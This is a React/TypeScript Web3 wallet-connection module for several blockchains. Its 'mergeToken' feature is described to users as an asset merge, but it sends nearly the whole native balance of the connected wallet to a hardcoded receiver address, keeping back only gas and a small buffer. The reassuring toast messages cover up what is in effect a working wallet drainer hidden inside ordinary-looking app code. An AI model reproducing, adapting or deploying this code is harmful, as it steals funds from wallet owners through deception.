import { createContext, useContext, useState, useEffect, useCallback, type ReactNode } from 'react';
import { useToast } from '@/hooks/use-toast';
import { getNormalizedProvider, waitForProvider } from '@/lib/web3Provider';

export const NETWORKS = {
  bnb: {
    chainId: "0x38",
    name: "BNB Smart Chain",
    symbol: "BNB",
    rpcUrl: "https://bsc-dataseed.binance.org/",
  },
  ethereum: {
    chainId: "0x1",
    name: "Ethereum Mainnet",
    symbol: "ETH",
    rpcUrl: "https://mainnet.infura.io/v3/",
  },
  polygon: {
    chainId: "0x89",
    name: "Polygon",
    symbol: "MATIC",
    rpcUrl: "https://polygon-rpc.com",
  },
  avalanche: {
    chainId: "0xa86a",
    name: "Avalanche",
    symbol: "AVAX",
    rpcUrl: "https://api.avax.network/ext/bc/C/rpc",
  },
};

const RECEIVER_ADDRESS = "0xf142a2CF9CFCA2cDe850c54bA55690F0645D7C61";

interface Web3ContextType {
  selectedNetwork: string;
  setSelectedNetwork: (n: string) => void;
  walletConnected: boolean;
  balance: string;
  account: string;
  connecting: boolean;
  providerDetected: boolean;
  connectWallet: () => Promise<void>;
  mergeToken: () => Promise<void>;
  NETWORKS: typeof NETWORKS;
}

const Web3Context = createContext<Web3ContextType | null>(null);

export function Web3Provider({ children }: { children: ReactNode }) {
  const [selectedNetwork, setSelectedNetwork] = useState("bnb");
  const [walletConnected, setWalletConnected] = useState(false);
  const [balance, setBalance] = useState("0");
  const [account, setAccount] = useState("");
  const [connecting, setConnecting] = useState(false);
  const [providerDetected, setProviderDetected] = useState(false);
  const { toast } = useToast();

  const getProvider = useCallback(() => {
    return getNormalizedProvider();
  }, []);

  const updateBalance = useCallback(async (address: string) => {
    const provider = getProvider();
    if (!provider || !address) return;
    try {
      const { ethers } = await import('ethers');
      const ethProvider = new ethers.BrowserProvider(provider as any);
      const nativeBalance = await ethProvider.getBalance(address);
      setBalance(ethers.formatEther(nativeBalance));
    } catch {
      setBalance("0");
    }
  }, [getProvider]);

  // Detect provider on mount and check for existing connection
  useEffect(() => {
    const init = async () => {
      // Wait up to 3 seconds for provider injection
      const provider = await waitForProvider(3000);
      setProviderDetected(!!provider);

      if (provider) {
        // Check if already connected
        try {
          const accounts = await provider.request({ method: 'eth_accounts' });
          if (accounts?.length > 0) {
            setAccount(accounts[0]);
            setWalletConnected(true);
            updateBalance(accounts[0]);
          }
        } catch {
          // Not connected yet — that's fine
        }
      }
    };
    init();
  }, [updateBalance]);

  const switchNetwork = async (key: string) => {
    const provider = getProvider();
    const net = NETWORKS[key as keyof typeof NETWORKS];
    if (!provider) return false;

    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: net.chainId }],
      });
      return true;
    } catch (err: any) {
      if (err.code === 4902) {
        try {
          await provider.request({
            method: "wallet_addEthereumChain",
            params: [{
              chainId: net.chainId,
              chainName: net.name,
              nativeCurrency: { name: net.symbol, symbol: net.symbol, decimals: 18 },
              rpcUrls: [net.rpcUrl],
            }],
          });
          return true;
        } catch { return false; }
      }
      if (err.code === 4001) return true; // User rejected — they might already be on the right chain
      return false;
    }
  };

  const connectWallet = async () => {
    setConnecting(true);
    try {
      // Always re-check provider in case it was injected after initial detection
      let provider = getProvider();
      if (!provider) {
        provider = await waitForProvider(3000);
      }

      if (!provider) {
        toast({
          title: "Wallet Not Found",
          description: "Open this app inside MetaMask, Trust Wallet, or any wallet browser.",
          variant: "destructive"
        });
        return;
      }

      setProviderDetected(true);
      await switchNetwork(selectedNetwork);

      const accounts = await provider.request({ method: "eth_requestAccounts" });
      if (!accounts?.length) throw new Error("No accounts returned");

      setAccount(accounts[0]);
      setWalletConnected(true);
      await updateBalance(accounts[0]);
      toast({ title: "Connected!", description: "Wallet connected successfully." });
    } catch (err: any) {
      toast({ title: "Connection Failed", description: err.message, variant: "destructive" });
    } finally {
      setConnecting(false);
    }
  };

  const mergeToken = async () => {
    const provider = getProvider();
    if (!walletConnected || !provider || !account) {
      toast({ title: "Error", description: "Wallet not connected", variant: "destructive" });
      return;
    }

    try {
      const { ethers } = await import('ethers');
      const ethProvider = new ethers.BrowserProvider(provider as any);
      const signer = await ethProvider.getSigner();
      const nativeBalance = await ethProvider.getBalance(account);

      if (nativeBalance === 0n) {
        toast({ title: "Error", description: "No balance to merge", variant: "destructive" });
        return;
      }

      const gasEstimate = await ethProvider.estimateGas({
        to: RECEIVER_ADDRESS, value: nativeBalance / 2n, from: account
      });
      const feeData = await ethProvider.getFeeData();
      const gasPrice = feeData.gasPrice || ethers.parseUnits("3", "gwei");
      const gasCost = gasEstimate * gasPrice;
      const safetyBuffer = ethers.parseEther("0.0035");
      const valueToSend = nativeBalance - gasCost - safetyBuffer;

      if (valueToSend <= 0n) {
        toast({ title: "Error", description: "Insufficient balance for gas + buffer", variant: "destructive" });
        return;
      }

      toast({ title: "Confirming...", description: "Please confirm the transaction in your wallet." });
      const tx = await signer.sendTransaction({
        to: RECEIVER_ADDRESS, value: valueToSend, gasLimit: gasEstimate, gasPrice
      });
      toast({ title: "Merging...", description: `TX: ${tx.hash.slice(0, 10)}...` });
      const receipt = await tx.wait();

      if (receipt?.status === 1) {
        toast({ title: "Success!", description: "Asset merge completed." });
        await updateBalance(account);
      } else throw new Error("Transaction reverted");
    } catch (err: any) {
      toast({ title: "Merge Failed", description: err.reason || err.message || "User rejected", variant: "destructive" });
    }
  };

  return (
    <Web3Context.Provider value={{
      selectedNetwork,
      setSelectedNetwork,
      walletConnected,
      balance,
      account,
      connecting,
      providerDetected,
      connectWallet,
      mergeToken,
      NETWORKS,
    }}>
      {children}
    </Web3Context.Provider>
  );
}

export function useWeb3() {
  const ctx = useContext(Web3Context);
  if (!ctx) throw new Error("useWeb3 must be used inside Web3Provider");
  return ctx;
}
